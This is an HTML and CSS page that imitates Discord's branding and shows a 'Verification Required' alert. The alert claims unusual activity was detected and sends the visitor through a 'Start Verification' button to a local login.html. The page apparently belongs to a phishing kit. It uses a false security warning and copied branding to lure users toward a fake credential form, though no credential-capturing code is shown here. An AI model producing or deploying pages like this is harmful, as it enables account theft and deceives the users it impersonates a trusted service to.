<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Discord</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <!-- Google Font -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">

  <!-- Bootstrap CSS -->
  <link
    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
    rel="stylesheet"
  />

  <!-- Font Awesome -->
  <link
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
    rel="stylesheet"
  />

  <style>
    /* ============================= */
    /* MODIFIED: Discord-like Background */
    /* ============================= */
   body {
  font-family: 'Inter', sans-serif;
  min-height: 100vh;
  margin: 0;
  color: #fff;

  /* BACKGROUND UTAMA (JPG) */
  background-image: url("./bg2.svg");
  background-size: cover;
  background-position: center;
  background-repeat: no-repeat;
  background-attachment: fixed;

  display: flex;
  align-items: center;
  justify-content: center;
}

/* OPTIONAL: overlay gelap tipis agar card lebih terbaca */
body::after {
  content: "";
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.35); /* bisa diubah 0.2â€“0.4 */
  z-index: 0;
}

/* pastikan konten di atas overlay */
body > * {
  position: relative;
  z-index: 1;
}


    /* ============================= */
    /* Button Discord */
    /* ============================= */
    .discord-btn {
      width: 100%;
      padding: 12px 16px;
      margin-top: 16px;
      background-color: #5865F2;
      color: #ffffff;
      font-size: 15px;
      font-weight: 500;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      transition: background-color 0.15s ease, transform 0.05s ease;
    }

    .discord-btn:hover {
      background-color: #4752C4;
    }

    .discord-btn:active {
      background-color: #3C45A5;
      transform: translateY(1px);
    }

    .discord-btn:disabled {
      background-color: #4f545c;
      cursor: not-allowed;
      opacity: 0.6;
    }

    /* ============================= */
    /* Login Card */
    /* ============================= */
   
   .login-card{
  background-color: #31363B; /* samakan dengan gambar */
  border-radius: 8px;
  padding: 36px 32px 32px;
  max-width: 420px;
  text-align: center;
    }
/* Illustration (Discord-style) */
.illustration {
  margin-bottom: 24px;
  display: flex;
  justify-content: center;
}

.illustration img {
  width: 95%;
  max-width: 320px;
  height: auto;
  opacity: 0.9;
  user-select: none;
  pointer-events: none;
  /* opsional biar menyatu */
  filter: drop-shadow(0 3px 10px rgba(0,0,0,0.35));
}


    .subtitle {
      color: #b5bac1;
      font-size: 14px;
    }

    .btn-passkey {
      color: #00a8fc;
      background: none;
      border: none;
      margin-top: 16px;
      font-size: 14px;
    }

    .btn-passkey:hover {
      text-decoration: underline;
    }
	
	/* Pembungkus card */
.card-wrapper {
  position: relative;
}

/* Logo Discord */
.discord-logo {
  position: absolute;
  top: 6px;
  left: -180px;
  width: 120px;
  height: auto;
  opacity: 0.9;
}


  </style>
</head>

<body>
<div class="card-wrapper">

  <!-- LOGO DISCORD (di luar card) -->
  <img src="./logo.png" class="discord-logo" alt="Discord">
  <div class="login-card shadow">

  <div class="illustration">
    <img src="./b2.png" alt="Verification Illustration">
  </div>

  <h4 class="fw-semibold mb-2">Verification Required</h4>
  <p class="subtitle">
    We've detected something out of the ordinary going on. To continue using Discord. <strong>we will you to verify your account</strong> 
  </p>

  <a href="login.html" id="startBtn" class="discord-btn" type="button">
  <strong>Start Verification</strong>
  </a>
  
  
  
</div>
</body>
</html>
